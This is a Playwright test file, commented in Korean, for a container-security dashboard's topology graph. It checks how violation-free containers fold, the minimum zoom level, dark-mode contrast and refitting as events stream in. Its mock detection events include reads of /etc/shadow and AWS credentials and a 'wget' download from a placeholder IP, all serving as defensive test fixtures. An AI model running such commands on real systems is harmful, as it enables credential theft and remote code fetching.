import type { Page } from '@playwright/test';
import type { Event, Verdict } from '../src/lib/types';
import { expect, SHOTS, test } from './fixtures';
import type { MockBackend } from './mock-backend';

// 11/09 사용자 결정 「정상 컨테이너 접기 + 최소 배율」 — 실제 가젯(전체 감시)에서 위반 없는 컨테이너의 /proc · /lib · /sys 열기가
// 노드를 세로로 쌓아 화면 맞춤이 약 0.35배(글자 약 4px)까지 줄던 문제(메인 실측: 컨테이너 3 · 노드 33 · 선 48).
// - 위반 있는 컨테이너는 지금처럼 펼침 · 위반 없는 컨테이너는 한 노드(이름 + 「파일 N · 연결 M」)로 접힘, 누르거나 Enter 로 펼침 · 다시 접힘
// - 컨테이너를 고르면 그 컨테이너는 펼친 상태 · 위반이 생기면 자동으로 펼침
// - 화면 맞춤은 노드 글자(12px)가 9px 아래로 보이지 않는 배율(0.75) 아래로 줄이지 않음 — 다 안 들어가면 위험 컨테이너(맨 위 · 왼쪽)부터
const READABLE = 0.75; // 12px × 0.75 = 9px
const SHOT_DIR = `${SHOTS}/topology-1109`;

// 위반 없는 「다른 프로젝트 DB」 컨테이너 — 프로세스 3개, 파일 files 개(/proc · /lib · /sys), 내부 연결 dests 개
const NORMAL = [
  { name: 'db-main', image: 'postgres:17', files: 20, dests: 2 },
  { name: 'db-replica', image: 'postgres:17', files: 14, dests: 1 },
  { name: 'cache-redis', image: 'redis:7', files: 9, dests: 0 },
  { name: 'metrics', image: 'prom/prometheus:v2', files: 12, dests: 3 },
];
const PROCS: Record<string, string[]> = {
  'db-main': ['postgres', 'pg_isready', 'sh'],
  'db-replica': ['postgres', 'pg_basebackup', 'sh'],
  'cache-redis': ['redis-server', 'redis-cli', 'sh'],
  metrics: ['prometheus', 'promtool', 'sh'],
};

function ev(name: string, image: string, at: number, e: Partial<Event> & Pick<Event, 'kind' | 'comm'>): Event {
  return { timestamp: new Date(at).toISOString(), containerId: `${name.replace(/[^a-z0-9]/g, '')}0123456789abcdef`, containerName: name, imageName: image, pid: 4300, ...e };
}

function seedNormal(b: MockBackend) {
  const now = Date.now();
  const out: Verdict[] = [];
  for (const c of NORMAL) {
    const procs = PROCS[c.name];
    for (let i = 0; i < c.files; i++) {
      const comm = procs[i % procs.length];
      const path = i % 3 === 0 ? `/proc/${100 + i}/stat` : i % 3 === 1 ? `/usr/lib/x86_64-linux-gnu/lib${c.name}-${i}.so.1` : `/sys/fs/cgroup/${c.name}/cpu.stat.${i}`;
      for (let k = 0; k <= i % 3; k++) out.push({ event: ev(c.name, c.image, now - 3_000 - i * 40 - k, { kind: 'open', comm, path }), matched: false });
    }
    for (let j = 0; j < c.dests; j++)
      out.push({ event: ev(c.name, c.image, now - 2_500 - j * 30, { kind: 'connect', comm: procs[0], dstIp: `10.0.1.${j + 1}`, dstPort: 5432, dnsTraced: true }), matched: false });
  }
  b.recent.unshift(...out);
}

const flow = (page: Page) => page.getByTestId('topology').locator('.react-flow');
const node = (page: Page, id: string) => page.locator(`.react-flow__node[data-id="${id}"]`);
const nodesOf = (page: Page, prefix: string) => page.locator(`.react-flow__node[data-id^="${prefix}"]`);
const folded = (page: Page) => page.locator('.react-flow__node[data-fold="folded"]');

// React Flow viewport transform 의 배율 — 맞춤이 끝나 300ms 동안 같은 값일 때까지 기다려 읽는다
async function settledScale(page: Page): Promise<number> {
  const read = () => page.locator('.react-flow__viewport').evaluate((el) => new DOMMatrixReadOnly(getComputedStyle(el).transform).a);
  let prev = -1;
  for (let i = 0; i < 40; i++) {
    const s = await read();
    if (Math.abs(s - prev) < 1e-4) return s;
    prev = s;
    await page.waitForTimeout(150);
  }
  return prev;
}

// 노드가 그래프 칸 안에 보이는지(위 · 왼쪽 기준)
async function inPane(page: Page, id: string) {
  const pane = (await flow(page).boundingBox())!;
  const box = (await node(page, id).boundingBox())!;
  return box.y >= pane.y - 1 && box.y + box.height <= pane.y + pane.height + 1 && box.x >= pane.x - 1 && box.x < pane.x + pane.width;
}

const lum = ([r, g, b]: number[]) => {
  const c = [r, g, b].map((v) => {
    const s = v / 255;
    return s <= 0.03928 ? s / 12.92 : ((s + 0.055) / 1.055) ** 2.4;
  });
  return 0.2126 * c[0] + 0.7152 * c[1] + 0.0722 * c[2];
};
const rgbOf = (s: string) => (s.match(/[\d.]+/g) ?? []).slice(0, 3).map(Number);
const contrast = (a: string, b: string) => {
  const [x, y] = [lum(rgbOf(a)), lum(rgbOf(b))].sort((p, q) => q - p);
  return (x + 0.05) / (y + 0.05);
};

test.describe('토폴로지 — 정상 컨테이너 접기 + 최소 배율 (11/09)', () => {
  test('① 위반 없는 컨테이너는 기본 접힘(이름 + 파일 · 연결 수) · 위반 있는 컨테이너는 펼침', async ({ page, backend }) => {
    seedNormal(backend);
    await page.goto('/topology');
    await expect(node(page, 'c:pkg-reqeusts')).toBeVisible();
    // 정상 6개(web-api · worker + 다른 프로젝트 4개) 접힘, 위반 컨테이너는 접히지 않음
    await expect(folded(page)).toHaveCount(6);
    await expect(node(page, 'c:pkg-reqeusts')).not.toHaveAttribute('data-fold', /.*/);
    await expect(node(page, 'f:pkg-reqeusts:/etc/shadow')).toBeVisible();
    await expect(nodesOf(page, 'p:pkg-reqeusts:')).toHaveCount(3);
    // 접힌 노드: 이름 + 요약 숫자(창 안의 전체 — 정상 말단 상한 6 과 무관), 안쪽 노드는 그리지 않음
    const db = node(page, 'c:db-main');
    await expect(db).toHaveAttribute('data-fold', 'folded');
    await expect(db).toHaveAttribute('aria-expanded', 'false');
    await expect(db).toContainText('db-main');
    await expect(db.locator('[data-part="fold-summary"]')).toHaveText('파일 20 · 연결 2');
    await expect(node(page, 'c:cache-redis').locator('[data-part="fold-summary"]')).toHaveText('파일 9 · 연결 0');
    await expect(node(page, 'c:web-api').locator('[data-part="fold-summary"]')).toHaveText('파일 1 · 연결 1');
    await expect(nodesOf(page, 'p:db-main:')).toHaveCount(0);
    await expect(nodesOf(page, 'f:db-main:')).toHaveCount(0);
    // 범례에 접힘 안내
    await expect(page.getByTestId('topology')).toContainText('위반 없는 컨테이너는 접힘');
  });

  test('② 누르면 펼침 · 다시 누르면 접힘 — Enter 도 같음, 접고 펼 때 상세 패널은 열리지 않음', async ({ page, backend }) => {
    seedNormal(backend);
    await page.goto('/topology');
    const db = node(page, 'c:db-main');
    await expect(db).toHaveAttribute('data-fold', 'folded');
    await db.click();
    await expect(db).toHaveAttribute('data-fold', 'open');
    await expect(db).toHaveAttribute('aria-expanded', 'true');
    await expect(nodesOf(page, 'p:db-main:')).toHaveCount(3);
    await expect(page.locator('.react-flow__node[data-id^="f:db-main:"], .react-flow__node[data-id^="d:db-main:"]')).toHaveCount(6); // 정상 말단 상한 6 그대로
    await expect(page.locator('.sg-sheet-layer')).toHaveCount(0);
    await db.click();
    await expect(db).toHaveAttribute('data-fold', 'folded');
    await expect(nodesOf(page, 'p:db-main:')).toHaveCount(0);
    // 키보드: 노드에 초점 → Enter
    const rep = node(page, 'c:db-replica');
    await rep.focus();
    await page.keyboard.press('Enter');
    await expect(rep).toHaveAttribute('data-fold', 'open');
    await expect(nodesOf(page, 'p:db-replica:')).toHaveCount(3);
    await rep.focus();
    await page.keyboard.press('Enter');
    await expect(rep).toHaveAttribute('data-fold', 'folded');
    await expect(page.locator('.sg-sheet-layer')).toHaveCount(0);
    // 위반 컨테이너 노드는 그대로 상세 패널
    await node(page, 'c:pkg-reqeusts').click();
    await expect(page.getByTestId('node-detail')).toContainText('pkg-reqeusts');
  });

  test('③ 컨테이너를 고르면 그 컨테이너는 펼친 상태 · 노드를 누르면 상세 패널', async ({ page, backend }) => {
    seedNormal(backend);
    await page.goto('/topology');
    await expect(node(page, 'c:db-main')).toBeVisible();
    await page.getByRole('combobox', { name: /^컨테이너/ }).selectOption('db-main');
    await expect(nodesOf(page, 'p:db-main:')).toHaveCount(3);
    await expect(folded(page)).toHaveCount(0);
    await node(page, 'c:db-main').click();
    await expect(page.getByTestId('node-detail')).toContainText('db-main');
  });

  test('④ 위반이 생기면 자동으로 펼침', async ({ page, backend }) => {
    seedNormal(backend);
    await page.goto('/topology');
    await expect(node(page, 'c:db-main')).toHaveAttribute('data-fold', 'folded');
    await expect(page.getByText('실시간 연결됨')).toBeVisible();
    backend.send({
      type: 'verdict',
      data: { event: ev('db-main', 'postgres:17', Date.now(), { kind: 'open', comm: 'sh', path: '/root/.aws/credentials' }), matched: true, ruleId: 'sensitive-files', action: 'alert', reason: '자격 증명 파일 접근' },
    });
    await expect(node(page, 'f:db-main:/root/.aws/credentials')).toBeVisible();
    await expect(node(page, 'c:db-main')).not.toHaveAttribute('data-fold', /.*/);
    await expect(nodesOf(page, 'p:db-main:')).toHaveCount(3);
    await expect(page.locator('[data-chain="db-main"]')).toBeVisible();
    await expect(folded(page)).toHaveCount(5);
  });

  test('⑤ 화면 맞춤 배율은 하한(0.75 = 글자 9px) 이상 — 다 안 들어가면 위험 컨테이너가 먼저 보임', async ({ page, backend }) => {
    seedNormal(backend);
    await page.goto('/topology');
    await expect(node(page, 'c:pkg-reqeusts')).toBeVisible();
    const s0 = await settledScale(page);
    expect(s0, `처음 맞춤 배율 ${s0}`).toBeGreaterThanOrEqual(READABLE);
    const font = await node(page, 'c:pkg-reqeusts').evaluate((el) => parseFloat(getComputedStyle(el).fontSize));
    expect(font * s0, '노드 글자 화면 크기(px)').toBeGreaterThanOrEqual(9);
    expect(await inPane(page, 'c:pkg-reqeusts')).toBe(true);
    // 접힌 상태는 한 화면에 다 들어가고 가로 가운데(맞춤이 실제로 돈 것 — 기본 시점이면 왼쪽에 붙는다)
    const fit = await page.evaluate(() => {
      const pane = document.querySelector('[data-testid="topology"] .react-flow')!.getBoundingClientRect();
      const boxes = [...document.querySelectorAll('.react-flow__node')].map((e) => e.getBoundingClientRect());
      const l = Math.min(...boxes.map((b) => b.left)), r = Math.max(...boxes.map((b) => b.right));
      const t = Math.min(...boxes.map((b) => b.top)), btm = Math.max(...boxes.map((b) => b.bottom));
      return { left: l - pane.left, right: pane.right - r, top: t - pane.top, bottom: pane.bottom - btm };
    });
    expect(Math.min(fit.left, fit.right, fit.top, fit.bottom), `전부 칸 안 ${JSON.stringify(fit)}`).toBeGreaterThanOrEqual(0);
    expect(Math.abs(fit.left - fit.right), `가로 가운데 ${JSON.stringify(fit)}`).toBeLessThanOrEqual(4);
    // 정상 컨테이너를 모두 펼쳐 칸을 넘치게 한 뒤 「화면 맞춤」 — 하한은 지키고 맨 위 위험 컨테이너가 보임
    // 펼칠 때마다 그 묶음이 보이게 옮기므로 다른 접힌 노드는 칸 밖일 수 있다 — 화면 위치와 무관하게 click 이벤트로
    for (const c of ['web-api', 'worker', ...NORMAL.map((n) => n.name)]) {
      await node(page, `c:${c}`).dispatchEvent('click');
      await expect(node(page, `c:${c}`)).toHaveAttribute('data-fold', 'open');
    }
    await page.locator('.react-flow__controls-fitview').click();
    const s1 = await settledScale(page);
    expect(s1, `모두 펼친 뒤 맞춤 배율 ${s1}`).toBeGreaterThanOrEqual(READABLE);
    expect(await inPane(page, 'c:pkg-reqeusts'), '위험 컨테이너가 칸 안').toBe(true);
    expect(await inPane(page, 'f:pkg-reqeusts:/etc/shadow'), '위험 컨테이너의 파일도 칸 안').toBe(true);
  });

  test('⑥ 다크 모드 — 접힌 노드가 바탕과 구분되고 글자 대비 4.5 이상', async ({ page, backend }) => {
    seedNormal(backend);
    await page.addInitScript(() => localStorage.setItem('supplyguard.theme', 'dark'));
    await page.goto('/topology');
    await expect.poll(() => page.evaluate(() => document.documentElement.dataset.theme)).toBe('dark');
    const db = node(page, 'c:db-main');
    await expect(db).toHaveAttribute('data-fold', 'folded');
    await expect(db.locator('[data-part="fold-summary"]')).toBeVisible();
    const c = await db.evaluate((el) => {
      const s = getComputedStyle(el);
      const name = el.querySelector('[data-part="fold-name"]')!;
      const sum = el.querySelector('[data-part="fold-summary"]')!;
      const pane = getComputedStyle(el.closest('[data-testid="topology"]')!);
      return { bg: s.backgroundColor, border: s.borderTopColor, name: getComputedStyle(name).color, sum: getComputedStyle(sum).color, pane: pane.backgroundColor };
    });
    expect(lum(rgbOf(c.bg)), '어두운 바탕').toBeLessThan(0.05);
    expect(c.bg, '접힌 노드 바탕 ≠ 그래프 칸 바탕').not.toBe(c.pane);
    expect(contrast(c.name, c.bg), '이름 대비').toBeGreaterThanOrEqual(4.5);
    expect(contrast(c.sum, c.bg), '요약 대비').toBeGreaterThanOrEqual(4.5);
  });

  test.describe('390 — 좁은 화면', () => {
    test.use({ viewport: { width: 390, height: 844 } });
    test('⑦ 배율 하한을 지키고 왼쪽(컨테이너 열)부터 보임', async ({ page, backend }) => {
      seedNormal(backend);
      await page.goto('/topology');
      await expect(node(page, 'c:pkg-reqeusts')).toBeVisible();
      const s = await settledScale(page);
      expect(s, `390 맞춤 배율 ${s}`).toBeGreaterThanOrEqual(READABLE);
      expect(await inPane(page, 'c:pkg-reqeusts')).toBe(true);
      await expect(node(page, 'c:db-main')).toHaveAttribute('data-fold', 'folded');
      await page.screenshot({ path: `${SHOT_DIR}/390-folded.png` });
    });
  });

  test('⑧ 스크린샷 1440×900 — 밝은 · 어두운, 접힘 · 펼침', async ({ page, backend }) => {
    seedNormal(backend);
    for (const theme of ['light', 'dark'] as const) {
      await page.addInitScript((t) => localStorage.setItem('supplyguard.theme', t), theme);
      await page.goto('/topology');
      await expect.poll(() => page.evaluate(() => document.documentElement.dataset.theme)).toBe(theme);
      await expect(node(page, 'c:db-main')).toHaveAttribute('data-fold', 'folded');
      await settledScale(page);
      await page.screenshot({ path: `${SHOT_DIR}/${theme}-folded.png` });
      await node(page, 'c:db-main').click();
      await expect(nodesOf(page, 'p:db-main:')).toHaveCount(3);
      await settledScale(page);
      await page.screenshot({ path: `${SHOT_DIR}/${theme}-open.png` });
    }
  });
});

// 11/09 2차(메인 실측 5173): 실제 가젯은 이벤트가 WebSocket 으로 계속 들어와 처음 몇 초 사이 그래프가 자란다.
// 처음 맞춤(정상 컨테이너 두 줄을 가운데 · 1.1배) 뒤 위험 컨테이너가 위에 끼어들어도 다시 맞추지 않아 위 절반이 비고 위험 컨테이너가 칸 아래로 나갔다.
// 사용자가 화면을 움직이기 전까지는 모양이 바뀌면 같은 규칙으로 다시 맞추고, 움직인 뒤에는 그대로 둔다(「화면 맞춤」 버튼은 다시 따라가기)
test.describe('토폴로지 — 실시간으로 자라는 그래프의 화면 맞춤 (11/09 2차)', () => {
  const RISKY = 'sg-topo-sample';
  const verdict = (name: string, e: Partial<Event> & Pick<Event, 'kind' | 'comm'>, hit?: { ruleId: string; action: 'alert' | 'kill' }): Verdict => {
    const event = ev(name, 'demo/sample:1', Date.now(), e);
    return hit ? { event, matched: true, ruleId: hit.ruleId, action: hit.action, reason: hit.ruleId, ...(hit.action === 'kill' && { dryRun: true, enforced: false }) } : { event, matched: false };
  };
  const send = (b: MockBackend, vs: Verdict[]) => vs.forEach((v) => b.send({ type: 'verdict', data: v }));
  const normal = (name: string, n: number, from = 0) =>
    Array.from({ length: n }, (_, i) => verdict(name, { kind: 'open', comm: 'postgres', path: `/proc/${from + i}/stat` }));
  // 위험 컨테이너: wget 실행(격리 대상) + 비밀 파일 열기 경고 16개(위험 말단은 상한 없이 전부) → 칸을 넘치는 높이
  const risky = (from: number, n: number) => [
    verdict(RISKY, { kind: 'exec', comm: 'wget', args: 'wget http://203.0.113.9/x' }, { ruleId: 'no-shell-download', action: 'kill' }),
    ...Array.from({ length: n }, (_, i) =>
      verdict(RISKY, { kind: 'open', comm: i % 2 ? 'cat' : 'sh', path: `/root/.secret-${from + i}` }, { ruleId: 'sensitive-files', action: 'alert' }),
    ),
  ];
  // 맞춤이 끝나 300ms 동안 같은 시점일 때까지 기다린다
  async function settled(page: Page): Promise<string> {
    const read = () => page.locator('.react-flow__viewport').evaluate((el) => getComputedStyle(el).transform);
    let prev = '';
    for (let i = 0; i < 40; i++) {
      const t = await read();
      if (t === prev) return t;
      prev = t;
      await page.waitForTimeout(300);
    }
    return prev;
  }
  // 그려진 노드 전체의 칸 안 위 · 아래 여백
  const margins = (page: Page) =>
    page.evaluate(() => {
      const pane = document.querySelector('[data-testid="topology"] .react-flow')!.getBoundingClientRect();
      const boxes = [...document.querySelectorAll('.react-flow__node')].map((e) => e.getBoundingClientRect());
      return { top: Math.min(...boxes.map((b) => b.top)) - pane.top, bottom: pane.bottom - Math.max(...boxes.map((b) => b.bottom)) };
    });
  // 실시간 시작: 런타임 이벤트 없이 열고, 정상 컨테이너 두 개 → 맞춤 → 위험 컨테이너가 나눠 들어옴
  async function stream(page: Page, b: MockBackend) {
    b.recent = b.recent.filter((v) => v.event.containerName.startsWith('sg-install-'));
    await page.goto('/topology');
    await expect(page.getByText('실시간 연결됨')).toBeVisible();
    send(b, [...normal('db-a', 3), ...normal('db-b', 3, 10)]);
    await expect(folded(page)).toHaveCount(2);
    await settled(page);
    for (let k = 0; k < 4; k++) {
      send(b, [...risky(k * 4, 4), ...normal('db-a', 2, 100 + k * 2)]);
      await page.waitForTimeout(400);
    }
    await expect(page.locator('.react-flow__node[data-id^="f:sg-topo-sample:"]')).toHaveCount(16);
  }

  test('⑨ 처음 맞춤 뒤 위험 컨테이너가 들어오면 다시 맞춤 — 위험 컨테이너가 칸 안 · 위쪽 빈 여백 없음', async ({ page, backend }) => {
    await stream(page, backend);
    await settled(page);
    const s = await page.locator('.react-flow__viewport').evaluate((el) => new DOMMatrixReadOnly(getComputedStyle(el).transform).a);
    expect(s, `배율 ${s}`).toBeGreaterThanOrEqual(READABLE);
    expect(await inPane(page, `c:${RISKY}`), '위험 컨테이너 노드가 칸 안').toBe(true);
    const m = await margins(page);
    // 칸을 넘치는 높이 — 위 · 왼쪽부터 맞춤(위 여백 = 맞춤 여백 24 안팎)
    expect(m.top, `위 여백 ${JSON.stringify(m)}`).toBeGreaterThanOrEqual(0);
    expect(m.top, `위 여백 ${JSON.stringify(m)}`).toBeLessThanOrEqual(40);
    await page.screenshot({ path: `${SHOT_DIR}/stream-refit.png` });
  });

  test('⑩ 사용자가 끌어 옮긴 뒤에는 자라도 다시 맞추지 않음 · 「화면 맞춤」은 다시 맞춤', async ({ page, backend }) => {
    await stream(page, backend);
    await settled(page);
    expect(await inPane(page, `c:${RISKY}`), '자동 맞춤으로 위험 컨테이너가 칸 안').toBe(true);
    // 노드가 없는 빈 바닥을 찾아 위로 120px 끈다
    const p = await page.evaluate(() => {
      const r = document.querySelector('[data-testid="topology"] .react-flow')!.getBoundingClientRect();
      for (let y = r.bottom - 40; y > r.top + 40; y -= 20)
        for (let x = r.left + 80; x < r.right - 40; x += 20) if (document.elementFromPoint(x, y)?.classList.contains('react-flow__pane')) return { x, y };
      return null;
    });
    expect(p, '빈 바닥').not.toBeNull();
    await page.mouse.move(p!.x, p!.y);
    await page.mouse.down();
    await page.mouse.move(p!.x, p!.y - 120, { steps: 6 });
    await page.mouse.up();
    const moved = await settled(page);
    // 더 자란다: 새 정상 컨테이너 2개 + 위험 말단 4개
    send(backend, [...normal('db-c', 3, 300), ...normal('db-d', 3, 400), ...risky(16, 4)]);
    await expect(folded(page)).toHaveCount(4);
    await expect(page.locator('.react-flow__node[data-id^="f:sg-topo-sample:"]')).toHaveCount(20);
    await page.waitForTimeout(1200);
    expect(await settled(page), '옮긴 시점 그대로').toBe(moved);
    // 「화면 맞춤」 → 위 · 왼쪽부터 다시
    await page.locator('.react-flow__controls-fitview').click();
    const fitted = await settled(page);
    expect(fitted).not.toBe(moved);
    expect(await inPane(page, `c:${RISKY}`)).toBe(true);
    expect((await margins(page)).top).toBeLessThanOrEqual(40);
  });
});
